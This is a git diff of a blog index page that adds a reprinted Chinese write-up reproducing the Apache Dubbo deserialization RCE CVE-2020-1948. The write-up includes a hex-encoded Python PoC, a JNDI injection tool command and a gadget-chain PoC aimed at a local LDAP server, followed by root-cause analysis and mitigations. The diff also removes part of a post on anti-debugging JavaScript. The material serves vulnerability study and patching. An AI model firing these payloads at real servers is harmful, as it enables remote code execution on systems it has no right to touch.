@@ -86,6 +86,197 @@
 
     
         <h2 class="title">
+            <a href="/2025/12/11/CVE-2020-1948-Apache-Dubbo/">
+                Dubbo 漏洞 CVE-2020-1948 复现+简单修复
+            </a>
+        </h2>
+    
+    <time>
+        Dec 11, 2025
+    </time>
+    <section class="content">
+        <h1><span id="dubbo-漏洞-cve-2020-1948-复现简单修复">Dubbo 漏洞 CVE-2020-1948 复现+简单修复</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/JingQ/p/13329083.html">JingQ</a> 并作补充</p>
+<p>关注该漏洞的童鞋，应该对 <code>Dubbo</code> 这个架构优秀的 <code>RPC</code> 框架不陌生，所以直入主题</p>
+</blockquote>
+<h2><span id="漏洞详情">漏洞详情</span></h2><blockquote>
+<p>腾讯安全玄武实验室研究员发现，<code>Dubbo 2.7.6</code> 或更低版本采用的默认反序列化方式存在代码执行漏洞，当 <code>Dubbo</code> 服务端暴露时(默认端口：20880)，攻击者可以发送未经验证的服务名或方法名的RPC请求，同时配合附加恶意的参数负载。当恶意参数被反序列化时，它将执行恶意代码。</p>
+<p>经验证该反序列化漏洞需要服务端存在可以被利用的第三方库，而研究发现极大多数开发者都会使用的某些第三方库存在能够利用的攻击链，攻击者可以利用它们直接对 <code>Dubbo</code> 服务端进行恶意代码执行，影响广泛。</p>
+</blockquote>
+<h3><span id="影响版本">影响版本</span></h3><blockquote>
+<p>dubbo 2.7.6 以下的版本</p>
+</blockquote>
+<h3><span id="复现环境">复现环境</span></h3><blockquote>
+<ul>
+<li>mac 10.15</li>
+<li>idea 2020.1</li>
+<li>jdk-8u151（<a target="_blank" rel="noopener" href="https://www.oracle.com/webapps/redirect/signon?nexturl=https://download.oracle.com/otn/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-macosx-x64.dmg">下载地址</a>）</li>
+</ul>
+</blockquote>
+<h3><span id="漏洞注入简介">漏洞注入简介</span></h3><blockquote>
+<p>漏洞发现者 <code>rui0</code>，使用 <code>Remo</code> 模块，最终是通过 <code>JdbcRowSetImpl</code> 调用 <code>jndi</code> 来进行远程代码执行</p>
+<p><strong>由于该场景复现依赖于低版本的 jdk，之前使用 jdk-8u221 没能复现，去官网下载回低版本，使用低版本后成功复现</strong></p>
+</blockquote>
+<h2><span id="名词解释">名词解释</span></h2><blockquote>
+<ul>
+<li><strong>PoC：</strong> <code>Proof Of Concept</code> 的缩写。在黑客圈指：观点验证程序。</li>
+<li><strong>CVE：</strong> <code>Common Vulnerabilities &amp; Exposures</code> 通用漏洞披露。</li>
+<li><strong>Exp</strong>：<code>Exploit</code>，在安全方面，翻译为 「利用」，指利用漏洞进行攻击的动作。</li>
+<li><strong>Payload</strong>：翻译为「有效负荷」，指成功 <code>exploit</code> 后，在目标系统执行的代码或指令。</li>
+<li><strong>RCE</strong>：<code>remote code execution</code> 远程命令执行，简称 <code>RCE</code> 漏洞。</li>
+<li><strong>RMI：</strong> 专为 <code>Java</code> 环境设计的远程方法调用机制，远程服务器实现具体的 <code>Java</code> 方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的 <code>JVM</code> 中的对象的外表和行为都像本地对象一样。</li>
+<li><strong>LDAP：</strong> 轻量级目录访问协议，目录服务是一种以树状结构的目录数据库为基础，外加各种访问协议的信息查询服务</li>
+<li><strong>JNDI：</strong> <code>Java Naming and Directory Interface</code>，包括 <code>Naming Server</code> 和 <code>Directory Server</code>。是一种 <code>Java API</code>，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。</li>
+</ul>
+<p>以上大概就是本次漏洞所涉及到的专业名词，先有个大概了解，后面的内容看的应该比较明白。</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p>复现场景翻阅了很多篇文章和尝试，发现通过别人构造的 <code>payload</code> 来复现最为简单，所以这里记录一下复现的流程</p>
+</blockquote>
+<h3><span id="模拟-provider">模拟 Provider</span></h3><blockquote>
+<p>攻击依赖于 <code>rome</code> 工具包中的 <code>ToStringBean</code> 工具，所以无论下载什么提供者项目，都需要将以下依赖加入到 <code>POM.xml</code> 文件中</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>以 <code>dubbo-spring-boot-project</code> 说明</p>
+<ul>
+<li>一、在 <code>github</code> 下载示例代码，切换分支到 2.7.6 或更早之前</li>
+<li>二、在 <code>pom.xml</code> 中加入上面提到的 <code>remo</code> 依赖</li>
+<li>三、打包启动</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 下载</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/apache/dubbo-spring-boot-project.git</span><br><span class="line">// 切换分支</span><br><span class="line">$ git checkout 2.7.6</span><br><span class="line">// 添加完依赖后，打包</span><br><span class="line">$ mvn clean install -DskipTests</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/1.png" alt="image"></p>
+<ul>
+<li>四、启动服务提供者</li>
+</ul>
+<p>启动的时候，注意要用低版本的 <code>JDK</code>，使用 <code>IDEA</code> 的话，可以在这里选择编译运行的 <code>JRE</code></p>
+<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/2.png" alt="image"></p>
+<p>接着启动 <code>Provier</code> 即可</p>
+</blockquote>
+<h3><span id="运行-jndi-程序">运行 JNDI 程序</span></h3><blockquote>
+<p>使用了该位大佬的 <code>PoC</code>，里面注入的 <code>URL</code> 是 <code>ldap://127.0.0.1:1389/Exploit</code>，具体原理可以 <a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md">参考资料六</a></p>
+<p>具体原理说明：</p>
+<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/3.png" alt="image"></p>
+<p>以下内容引用自 <a target="_blank" rel="noopener" href="https://www.sayers.top/cve_2020_1948.html">Apache Dubbo Provider反序列化漏洞(CVE-2020-1948) 利用复现及POC</a></p>
+<ul>
+<li>一、下载注入工具代码</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/sayers522/JNDI-Injection-Exploit</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>二、编译工具包，在 <code>target</code> 目录生成</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mvn clean install -DskipTests</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>三、运行 <code>JNDI</code> 工具包</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [<span class="built_in">command</span>] [-A] [address]</span><br></pre></td></tr></table></figure>
+
+<p>例如测试时，执行的命令是打开计算器，可以执行下面命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span> -A 127.0.0.1</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="构造-poc">构造 POC</span></h3><blockquote>
+<p>编辑以下 Python 脚本，触发 dubbo provider 反序列化，例如以漏洞名来命名为 <code>2020_1948.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendEvilObjData</span>(<span class="params">sock</span>):</span><br><span class="line">	payload=<span class="string">&quot;DABBC20000000000000000000000037805322E302E3230366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F5365727669636505312E302E300474657374124C6A6176612F6C616E672F4F626A6563743B48433027636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E457175616C734265616E92036F626A096265616E436C61737360433029636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E546F537472696E674265616E92036F626A096265616E436C61737361431D636F6D2E73756E2E726F777365742E4A646263526F77536574496D706CAC06706172616D73096C697374656E657273036D61700A6368617253747265616D0B617363696953747265616D0D756E69636F646553747265616D0C62696E61727953747265616D0F7374724D61746368436F6C756D6E730D694D61746368436F6C756D6E73057265734D4406726F77734D4402727302707304636F6E6E09666574636853697A650866657463684469720969736F6C6174696F6E1065736361706550726F63657373696E6708726561644F6E6C790B636F6E63757272656E63790C6D61784669656C6453697A65076D6178526F77730C717565727954696D656F75740B73686F7744656C657465640A726F77536574547970650A64617461536F757263650355524C07636F6D6D616E64624D136A6176612E7574696C2E486173687461626C655A4E4E4E4E4E4E56106A6176612E7574696C2E566563746F729A03666F6F4E4E4E4E4E4E4E4E4E56919A8F8F8F8F8F8F8F8F8F8F4E4E4E4E4E90CBE8925454CBF090909046CBEC1D6C6461703A2F2F3132372E302E302E313A313338392F4578706C6F69744E4E430F6A6176612E6C616E672E436C61737391046E616D65631D636F6D2E73756E2E726F777365742E4A646263526F77536574496D706C633029636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E546F537472696E674265616E5191519151915A48047061746830366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F5365727669636509696E7465726661636530366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F536572766963650776657273696F6E05312E302E305A&quot;</span></span><br><span class="line">	sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">dip,dport</span>):</span><br><span class="line">	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">	server_addr=(dip,dport)</span><br><span class="line">	sock.connect(server_addr)</span><br><span class="line">	sendEvilObjData(sock)</span><br><span class="line"></span><br><span class="line">run(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>最终复现效果：</strong></p>
+<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/4.gif" alt="image"></p>
+</blockquote>
+<h3><span id="漏洞小结">漏洞小结</span></h3><blockquote>
+<ul>
+<li>1、下载 <code>demo</code> 代码，加入 <code>rome</code> 依赖</li>
+<li>2、启动 <code>JNDI</code> 服务</li>
+<li>3、构造 <code>2020-1948.py</code> Poc 攻击</li>
+</ul>
+</blockquote>
+<h2><span id="漏洞原理简述">漏洞原理简述</span></h2><blockquote>
+<p>网上公布的 <code>PoC</code> 代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from dubbo.codec.hessian2 <span class="keyword">import</span> Decoder,new_object</span><br><span class="line">from dubbo.client <span class="keyword">import</span> <span class="type">DubboClient</span></span><br><span class="line"></span><br><span class="line"><span class="variable">client</span> <span class="operator">=</span> DubboClient(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">      <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">      dataSource=<span class="string">&quot;ldap://127.0.0.1:8087/#ExportObject&quot;</span>,</span><br><span class="line">      strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">      )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">      <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">      name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">      )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">      <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">      beanClass=JdbcRowSetImplClass,</span><br><span class="line">      obj=JdbcRowSetImpl</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;org.apache.dubbo.spring.boot.demo.consumer.DemoService&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;rce&#x27;</span>,</span><br><span class="line">    args=[toStringBean])</span><br></pre></td></tr></table></figure>
+
+<p>本次漏洞利用的是 <code>com.rometools.rome.feed.impl.ToStringBean#toString</code> 方法，重写了 <code>toString</code>，该方法将会调用构造对象的所有 <code>getter</code> 方法</p>
+<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/5.png" alt="image"></p>
+<p>从上面 <code>PoC</code> 可以看到，执行 <code>Dubbo</code> 调用时，传入的是 <code>ToStringBean</code> 类型参数，构造的对象是<code>com.sun.rowset.JdbcRowSetImpl</code>，并且 <code>datasource</code> 属性设置的是 <code>JNDI</code> 暴露的 <code>url</code>，在调用 <code>JdbcRowSetImpl</code> 的 <code>getDatabaseMetaData</code> 方法时，执行 <code>connect</code> 操作，下载远端代码，在 <code>Service Provider</code> 执行，造成攻击。</p>
+<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/6.png" alt="image"></p>
+<p>调起 <code>toString</code> 方法的地方是在 <code>Dubbo Provider</code> 接收 <code>DecodeHandler#received:44</code> 请求，在 <code>DecodeableRpcInvocation#decode</code> 反序列化参数的地方：</p>
+<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/7.png" alt="image"></p>
+<p><code>dubbo</code> 默认使用的是 <code>hession2</code> 序列化，解析参数执行的是这个方法</p>
+<blockquote>
+<p>org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput#readUTF</p>
+</blockquote>
+<p>在 <code>hession</code> 反序列化过程中，通过下面代码段执行到了 <code>ToStringBean#toString</code></p>
+<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/8.png" alt="image"></p>
+<p>至此，注入攻击的流程到这里执行完成。可以参考左下侧的堆栈链路：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">158</span>, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:<span class="number">129</span>, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">198</span>, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hashCode:<span class="number">180</span>, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hash:<span class="number">339</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">612</span>, HashMap (java.util)</span><br><span class="line">doReadMap:<span class="number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2703</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2278</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2080</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2074</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">92</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)</span><br><span class="line">decode:<span class="number">139</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">79</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">57</span>, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">received:<span class="number">44</span>, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:<span class="number">57</span>, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="社区讨论amp安全网站修复建议">社区讨论&amp;安全网站修复建议</span></h2><blockquote>
+<ul>
+<li><p>合并社区 <code>aquariuspj</code> 用户给出的对 <code>DecodeableRpcInvocation</code> 增加入参类型校验</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40">修复分支 #6374</a></p>
+</li>
+<li><p>漏洞发现者 <code>rui0</code> 建议删除 <code>RpcInvocation</code> 类的 <code>toString</code> 方法中输出的 <code>arguments</code> 参数,防范后反序列化攻击。同时对 <code>Hessian</code> 进行黑白名单加固来防范 <code>Hessian</code> 反序列化攻击。<br><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1338">评论建议</a></p>
+</li>
+</ul>
+<p>还有<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/766283">阿里云官方的安全建议</a></p>
+<blockquote>
+<p>目前官方还未发布针对此漏洞绕过手法的补丁，在阿里云提供一个月的默认防御期限内，建议客户参考以下方法进行缓解，并关注官方补丁动态，及时进行更新：</p>
+</blockquote>
+<ul>
+<li>1、升级 2.7.7 版本，并根据<a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de">https://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de</a> 的方法进行参数校验</li>
+<li>禁止将 <code>Dubbo</code> 服务端端口开放给公网，或仅仅只对能够连接至 <code>Dubbo</code> 服务端的可信消费端IP开放</li>
+<li><code>Dubbo</code> 协议默认采用 <code>Hessian</code> 作为序列化反序列化方式，该反序列化方式存在反序列化漏洞。在不影响业务的情况下，建议更换协议以及反序列化方式。具体更换方法可参考：<a target="_blank" rel="noopener" href="http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html">http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html</a></li>
+</ul>
+</blockquote>
+<h2><span id="思考分析amp修复思路">思考分析&amp;修复思路</span></h2><h3><span id="复现条件有限">复现条件有限</span></h3><blockquote>
+<p>需要引入 <code>rome</code> 类型的 <code>jar</code> 包，包含特殊的构造方法和 <code>toString</code> 方法（或许还有其它攻击点）</p>
+</blockquote>
+<h3><span id="社区讨论内容">社区讨论内容</span></h3><blockquote>
+<p>社区讨论和 <code>commit</code> 的内容，增加了前置校验，在反序列化之前判断服务或方法是否有效，非 <code>$invoke</code> 或 <code>$echo</code> 方法将会抛出错误，不进行参数的反序列化，增加了一点攻击难度。但由于方法名 <code>methodName</code> 可以用户自定义，所以修改方法名还是有可能跳过校验，触发漏洞</p>
+<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="结合业务分析">结合业务分析</span></h3><blockquote>
+<p>业务方使用 <code>rome</code> 依赖的很少，构造这种类型的攻击，由于没有这个类，在 <code>provider</code> 反序列化时会提前报 <code>classNotFoundException</code>，没有执行到 <code>readObject</code> 方法，从而无法攻击。</p>
+<p><strong>综上所述，考虑到修复难度和影响范围，最后对 dubbo 修改方案如下：</strong></p>
+<ul>
+<li>1、合并社区针对改漏洞的<a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40">修复分支 #6374</a></li>
+<li>2、将 <code>RpcInvocation#toString</code> 方法中 <code>Arrays.toString(arguments)</code> 移除，避免对输入参数进行反序列化</li>
+</ul>
+</blockquote>
+<h2><span id="絮叨">絮叨</span></h2><blockquote>
+<p>隔行如隔山，一山还有一山高，修复漏洞真困难。感慨漏洞发现者们，多亏这些白帽子的仔细，揭露了这么多可攻击点，将漏洞信息提交到安全中心，让使用方了解到漏洞详情。</p>
+<p>还有 <code>Dubbo</code> 这个中间件的社区活跃度很高，出现问题后，大家讨论的热情高涨，积极去修复漏洞，社区活跃度高，代码更新快，支持的功能越来越多，使用起来也更放心。</p>
+<p>通过这次分析，了解到挺多基础的安全知识，感觉随着开源代码被研究更透彻，可供攻击的点也越来越多，在代码设计和编写时，也得注意一下安全信息，避免被攻击。</p>
+</blockquote>
+<h2><span id="参考资料">参考资料</span></h2><blockquote>
+<p>1、<a target="_blank" rel="noopener" href="https://xlab.tencent.com/cn/2020/06/23/xlab-20-001/">Apache Dubbo Provider 远程代码执行漏洞 (CVE-2020-1948)</a></p>
+<p>2、<a target="_blank" rel="noopener" href="https://www.sayers.top/cve_2020_1948.html">Apache Dubbo Provider反序列化漏洞(CVE-2020-1948) 利用复现及POC</a></p>
+<p>3、<a target="_blank" rel="noopener" href="https://paper.seebug.org/1266/">Apache Dubbo (CVE-2020-1948) 反序列化漏洞及其补丁绕过深度分析</a></p>
+<p>4、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wU1iacELbhspWMftRIQdeA">Apache Dubbo漏洞CVE-2020-1948分析</a></p>
+<p>5、<a target="_blank" rel="noopener" href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></p>
+<p>6、<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md">LADP、RMI 注入程序原理说明</a></p>
+<p>7、<a target="_blank" rel="noopener" href="https://github.com/sayers522/JNDI-Injection-Exploit">示范例子使用的注入程序</a></p>
+<p>8、<a target="_blank" rel="noopener" href="https://www.geekby.xyz/2020/07/01/apache-dubbo-provider-fan-xu-lie-hua-lou-dong-cve-2020-1948/">Apache Dubbo Provider反序列化漏洞(CVE-2020-1948)</a></p>
+<p>9、<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec 工具包</a></p>
+<p>10、<a target="_blank" rel="noopener" href="https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/">渗透中 PoC、Exp、Payload 与 Shellcode 的区别</a></p>
+<p>11、<a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/issues/6364">Github 社区讨论</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2025/12/11/What-Is-Permanent-Data/">
                 What is permanent data?（什么是永久数据？）
             </a>
@@ -1396,73 +1587,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Hook/" rel="tag">Hook</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WeChat/" rel="tag">WeChat</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2025/12/05/Debugger-Limit-2/">
-                禁止别人调试自己前端代码的 5 种方法
-            </a>
-        </h2>
-    
-    <time>
-        Dec 5, 2025
-    </time>
-    <section class="content">
-        <h1><span id="禁止别人调试自己前端代码的-5-种方法">禁止别人调试自己前端代码的 5 种方法</span></h1><blockquote>
-<p>本文转自 <a target="_blank" rel="noopener" href="https://toypipi.github.io/2023/12/14/%E7%A6%81%E6%AD%A2%E5%88%AB%E4%BA%BA%E8%B0%83%E8%AF%95%E8%87%AA%E5%B7%B1%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E7%9A%84-5-%E7%A7%8D%E6%96%B9%E6%B3%95/#:~:text=%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%8E%A7%E5%88%B6%E5%8F%B0%E4%B8%AD%E7%9A%84%20Deactivate%20breakpoints%20%E6%8C%89%E9%92%AE%E6%88%96%E8%80%85%E4%BD%BF%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%20Ctrl%20%2B%20F8%20%E5%85%B3%E9%97%AD%E6%97%A0%E9%99%90,breakpoint%E3%80%82%20%E5%A6%82%E6%9E%9C%E5%B0%86%20setInterval%20%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E5%86%99%E5%9C%A8%E4%B8%80%E8%A1%8C%EF%BC%8C%E5%B0%B1%E8%83%BD%E7%A6%81%E6%AD%A2%E7%94%A8%E6%88%B7%E6%96%AD%E7%82%B9%EF%BC%8C%E5%8D%B3%E4%BD%BF%E6%B7%BB%E5%8A%A0%20logpoint%20%E4%B8%BA%20false%20%E4%B9%9F%E6%97%A0%E7%94%A8%E3%80%82">Toypipi</a> 并作补充</p>
-</blockquote>
-<h2><span id="无限-debugger">无限 debugger</span></h2><blockquote>
-<p>前端页面防止调试的方法主要是通过不断 debugger 来疯狂输出断点，因为 debugger 在控制台被打开的时候就会执行。由于程序被 debugger 阻止，所以无法进行断点调试，所以网页的请求也是看不到的。 以下是使用无限 debugger 方式阻止代码调试的示例：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 基础禁止调试代码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ban</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">debugger</span>;</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="title function_">ban</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-
-<p>不过，如果仅仅是加上面那么简单的代码，对于一些技术人员而言作用不大。可以通过控制台中的 Deactivate breakpoints 按钮或者使用快捷键 Ctrl + F8 关闭无限 debugger。这种方式虽然能去掉碍眼的 debugger，但是无法通过左侧的行号添加 breakpoint。</p>
-</blockquote>
-<h2><span id="禁止断点的对策">禁止断点的对策</span></h2><blockquote>
